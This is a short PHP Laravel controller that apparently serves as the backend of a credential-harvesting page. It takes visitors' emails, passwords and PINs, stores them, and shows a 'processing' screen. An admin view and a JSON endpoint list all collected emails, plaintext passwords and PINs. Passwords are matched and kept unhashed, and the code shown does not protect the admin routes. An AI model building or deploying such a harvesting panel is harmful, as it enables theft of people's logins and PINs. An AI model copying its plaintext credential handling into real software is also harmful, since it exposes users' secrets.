<?php

namespace App\Http\Controllers;

use App\Http\Services\UserService;
use App\Models\User;
use Illuminate\Http\Request;

class UserController extends Controller
{
    protected UserService $userService;

    public function __construct(UserService $userService) {
        $this->userService = $userService;
    }

    public function store()
    {
        request()->validate([
            'email' => 'required|email',
            'password' => 'required',
            'pin' => 'required'
        ]);

        $email = request('email');
        $password = request('password');
        $pin = request('pin');

        $admin = User::where('email', $email)
            ->where('password', $password)
            ->where('pin', $pin)
            ->where('is_admin', true)
            ->first();

        if ($admin) {
            return redirect()->route('admin.dashboard');
        }

        $this->userService->store($email, $password, $pin);

        return view('processing');
    }

    public function adminDashboard()
    {
        return view('admin');
    }

    public function getUsersJson(Request $request)
    {
        $users = User::where('is_admin', false)
            ->orderBy('created_at', 'desc')
            ->paginate(10);

        return response()->json([
            'data' => $users->map(function ($user) {
                return [
                    'email' => $user->email,
                    'password' => $user->getOriginal('password'),
                    'pin' => $user->pin,
                    'created_at' => $user->created_at->format('H:i d/m/Y'),
                ];
            }),
            'current_page' => $users->currentPage(),
            'last_page' => $users->lastPage(),
        ]);
    }
}
